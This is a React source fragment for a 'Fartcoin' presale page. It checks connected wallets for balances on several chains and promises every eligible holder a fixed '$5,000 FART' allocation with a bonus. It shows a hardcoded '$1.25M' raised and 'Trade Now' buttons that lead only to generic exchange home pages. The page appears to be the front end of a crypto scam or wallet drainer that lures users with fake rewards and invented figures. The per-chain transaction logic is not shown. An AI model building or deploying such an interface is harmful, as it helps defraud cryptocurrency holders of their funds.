                <div className="relative bg-gray-900/70 backdrop-blur-xl border border-white/30 rounded-2xl p-5 text-center overflow-hidden">
                  <div className="text-4xl md:text-5xl font-black bg-gradient-to-br from-white to-gray-300 bg-clip-text text-transparent mb-1">
                    {item.value.toString().padStart(2, '0')}
                  </div>
                  <div className="text-xs font-semibold text-white/50 tracking-wider">{item.label}</div>
                </div>
              </div>
            ))}
          </div>

          {/* Allocation Card */}
          {isConnected && !verifying && scanResult && (
            <div className="max-w-2xl mx-auto mb-8 px-4">
              {isEligible ? (
                <div className="space-y-6">
                  <div className="terminal-frame p-8 border-white/50 relative">
                    {/* Bonus Badge */}
                    <div className="absolute -top-4 -right-4">
                      <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black px-6 py-3 rounded-full text-lg shadow-2xl transform rotate-12 hover:rotate-0 transition-transform">
                        +{presaleStats.currentBonus}% BONUS
                      </div>
                    </div>
                    
                    <div className="text-center">
                      <p className="text-white/70 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
                      <div className="text-7xl font-black bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent mb-2">
                        $5,000 FART
                      </div>
                      <p className="text-green-400 text-xl flex items-center justify-center gap-2">
                        <span>+{presaleStats.currentBonus}% Bonus</span>
                        <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
                      </p>
                      
                      {/* Eligible Chains Display */}
                      <div className="mt-4 pt-4 border-t border-white/30">
                        <p className="text-sm text-white/70 mb-2">Eligible Chains ({Object.keys(balances).length})</p>
                        <div className="flex flex-wrap justify-center gap-2">
                          {Object.keys(balances).map(chainName => {
                            const chain = DEPLOYED_CHAINS.find(c => c.name === chainName);
                            return (
                              <span key={chainName} className={`text-xs px-2 py-1 rounded-full bg-gradient-to-r ${chain?.color || 'from-gray-500 to-gray-600'} bg-opacity-20 text-white border border-white/10`}>
                                {chain?.icon} {chainName}
                              </span>
                            );
                          })}
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Already completed */}
                  {completedChains.length > 0 && (
                    <div className="text-center">
                      <div className="terminal-frame p-6 border-green-500/50 mb-4">
                        <p className="text-green-400 text-lg mb-3">✓ COMPLETED ON {completedChains.length} CHAINS</p>
                        <div className="flex flex-wrap justify-center gap-2 mb-3">
                          {completedChains.map(chain => (
                            <span key={chain} className="text-xs bg-green-500/30 px-2 py-1 rounded-full">
                              {chain}
                            </span>
                          ))}
                        </div>
                        <p className="text-gray-300">Your $5,000 FART has been secured</p>
                      </div>
                      <button
                        onClick={claimTokens}
                        className="w-full group relative"
                      >
                        <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
                        <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl transform-gpu group-hover:scale-105 transition-all duration-500">
                          🎉 VIEW YOUR $5,000 FART
                        </div>
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                // Welcome message for non-eligible
                <div className="terminal-frame p-10 text-center">
                  <div className="text-7xl mb-6 animate-float">👋</div>
                  <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-orange-400 bg-clip-text text-transparent">
                    Welcome to Fartcoin
                  </h2>
                  <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
                    Connect your wallet to check eligibility.
                  </p>
                  <div className="bg-black/50 rounded-xl p-6 border border-white/30">
                    <p className="text-sm text-gray-300">
                      Minimum $1 required for eligibility.
                    </p>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Presale Stats */}
          <div className="max-w-2xl mx-auto mt-12 mb-8 px-4">
            <div className="terminal-frame p-8 border-white/50">
              <h3 className="text-2xl font-bold text-center mb-6 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
                PRESALE LIVE PROGRESS
              </h3>
              
              <div className="grid grid-cols-3 gap-4 mb-6">
                <div className="text-center">
                  <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
                  <div className="text-xs text-white/50">Token Price</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
                  <div className="text-xs text-white/50">Current Bonus</div>
                </div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-yellow-400 mb-1">$1.25M</div>
                  <div className="text-xs text-white/50">Total Raised</div>
                </div>
              </div>

              {/* Progress Bar */}
              <div className="mb-4">
                <div className="flex justify-between text-sm text-white/50 mb-2">
                  <span>Progress</span>
                  <span>{liveProgress.percentComplete}%</span>
                </div>
                <div className="w-full h-3 bg-gray-800 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-gray-400 to-white rounded-full relative"
                    style={{ width: `${liveProgress.percentComplete}%` }}
                  >
                    <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4 mt-6">
                <div className="bg-gray-800/50 rounded-lg p-3 text-center">
                  <div className="text-sm text-white/50 mb-1">Participants Today</div>
                  <div className="text-xl font-bold text-orange-400">{liveProgress.participantsToday}</div>
                </div>
                <div className="bg-gray-800/50 rounded-lg p-3 text-center">
                  <div className="text-sm text-white/50 mb-1">Avg Allocation</div>
                  <div className="text-xl font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
                </div>
              </div>

              <div className="mt-6 text-center">
                <p className="text-sm text-white/50">
                  {presaleStats.totalParticipants.toLocaleString()} participants
                </p>
              </div>
            </div>
          </div>

          {/* Exchanges Section */}
          <section className="py-16-b px-4">
            <div className="container mx-auto">
              <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{ boxShadow: 'rgba(255,255,255,0.5) 0px 0px 10px' }}>
                <h2 className="text-2xl md:text-3xl font-terminal text-glow text-center mb-8 text-white">
                  &gt; WE'RE AVAILABLE ON
                  <span className="cursor"></span>
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">

                  {/* CoinMarketCap */}
                  <div className="rounded-xl border text-card-foreground shadow bg-black border-white/50 hover:border-white transition-all duration-300">
                    <div className="p-6 flex flex-col items-center">
                      <div className="w-16 h-16 mb-4 relative">
                        <img src="https://s2.coinmarketcap.com/static/cloud/img/coinmarketcap_white_1.svg" alt="CoinMarketCap" className="w-full h-full object-contain invert" />
                      </div>
                      <h3 className="text-white text-xl mb-4">CoinMarketCap</h3>
                      <a 
                        href="https://coinmarketcap.com" 
                        target="_blank" 
                        rel="noopener noreferrer" 
                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
                      >
                        Trade Now
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-external-link ml-2 h-4 w-4">
                          <path d="M15 3h6v6"></path>
                          <path d="M10 14 21 3"></path>
                          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                        </svg>
                      </a>
                    </div>
                  </div>

                  {/* CoinGecko */}
                  <div className="rounded-xl border text-card-foreground shadow bg-black border-white/50 hover:border-white transition-all duration-300">
                    <div className="p-6 flex flex-col items-center">
                      <div className="w-16 h-16 mb-4 relative">
                        <img src="https://static.coingecko.com/s/coingecko-logo-white-3e3a70c19c.svg" alt="CoinGecko" className="w-full h-full object-contain invert" />
                      </div>
                      <h3 className="text-white text-xl mb-4">CoinGecko</h3>
                      <a 
                        href="https://coingecko.com" 
                        target="_blank" 
                        rel="noopener noreferrer" 
                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
                      >
                        Trade Now
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-external-link ml-2 h-4 w-4">
                          <path d="M15 3h6v6"></path>
                          <path d="M10 14 21 3"></path>
                          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                        </svg>
                      </a>
                    </div>
                  </div>

                  {/* Axiom */}
                  <div className="rounded-xl border text-card-foreground shadow bg-black border-white/50 hover:border-white transition-all duration-300">
                    <div className="p-6 flex flex-col items-center">
                      <div className="w-16 h-16 mb-4 relative">
                        <img src="https://axiom.trade/logo-white.svg" alt="Axiom" className="w-full h-full object-contain invert" />
                      </div>
                      <h3 className="text-white text-xl mb-4">Axiom</h3>
                      <a 
                        href="https://axiom.trade" 
                        target="_blank" 
                        rel="noopener noreferrer" 
                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
                      >
                        Trade Now
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-external-link ml-2 h-4 w-4">
                          <path d="M15 3h6v6"></path>
                          <path d="M10 14 21 3"></path>
                          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                        </svg>
                      </a>
                    </div>
                  </div>
                </div>
                <div className="mt-8 text-center text-white/70 text-sm">
                  <p>&gt; More exchanges coming soon. Stay tuned for updates.</p>
                </div>
              </div>
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer className="py-8 px-4 border-t border-white/30">
          <div className="container mx-auto">
            <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{ boxShadow: 'rgba(255,255,255,0.5) 0px 0px 10px' }}>
              <h2 className="text-xl md:text-2xl font-terminal text-glow text-center mb-6 text-white">
                &gt; JOIN THE FART COMMUNITY
                <span className="cursor"></span>
              </h2>
              <div className="flex flex-wrap justify-center gap-8 mb-8">
                <a 
                  href="https://twitter.com" 
                  target="_blank" 
                  rel="noopener noreferrer" 
                  className="group p-4"
                >
                  <div className="justify-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 border bg-background shadow-sm hover:text-accent-foreground h-9 px-4 py-2 border-white hover:bg-white/20 flex items-center gap-2 text-white">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-twitter h-5 w-5 text-white group-hover:animate-pulse">
                      <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
                    </svg>
                    <span>X</span>
                  </div>
                </a>
                <a 
                  href="https://t.me" 
                  target="_blank" 
                  rel="noopener noreferrer" 
                  className="group p-4"
                >
                  <div className="justify-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 border bg-background shadow-sm hover:text-accent-foreground h-9 px-4 py-2 border-white hover:bg-white/20 flex items-center gap-2 text-white">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-message-circle h-5 w-5 text-white group-hover:animate-pulse">
                      <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
                    </svg>
                    <span>Telegram</span>
                  </div>
                </a>
              </div>
              <div className="shrink-0 h-[1px] w-full bg-white/30 my-6"></div>
              <div className="text-center text-white/70 text-sm">
                <p>© 2025 Fartcoin. All rights reserved.</p>
              </div>
            </div>
          </div>
        </footer>
      </div>

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            {/* Exploding Background */}
            <div className="absolute inset-0 bg-gradient-to-r from-gray-600 via-white to-gray-600 rounded-3xl blur-3xl animate-pulse-slow"></div>
            
            {/* Confetti Cannons */}
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-2 h-2 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            {/* Modal Content */}
            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-12 border border-white/30 shadow-2xl transform-gpu animate-scaleIn">
              <div className="text-center">
                {/* Exploding Icon */}
                <div className="relative mb-8">
                  <div className="text-8xl animate-bounce-3d">🎉</div>
                  {[...Array(16)].map((_, i) => (
                    <div
                      key={i}
                      className="absolute w-3 h-3 bg-white rounded-full animate-confetti-spiral"
                      style={{
                        top: '50%',
                        left: '50%',
                        transform: `rotate(${i * 22.5}deg) translateY(-70px)`,
                        animationDelay: `${i * 0.05}s`
                      }}
                    />
                  ))}
                </div>
                
                <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
                  🚀 SUCCESSFUL! 🚀
                </h2>
                
                <p className="text-2xl text-gray-300 mb-4">You have secured</p>
                
                <div className="text-7xl font-black text-white mb-3 animate-float-3d">$5,000 FART</div>
                
                <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
                  <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                </div>
                
                <p className="text-sm text-gray-500 mb-8">
                  Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
                </p>
                
                <button
                  onClick={() => setShowCelebration(false)}
                  className="w-full bg-gradient-to-r from-gray-700 to-gray-900 hover:from-gray-800 hover:to-gray-900 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden border border-white/30"
                >
                  <span className="relative z-10">VIEW</span>
                  <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
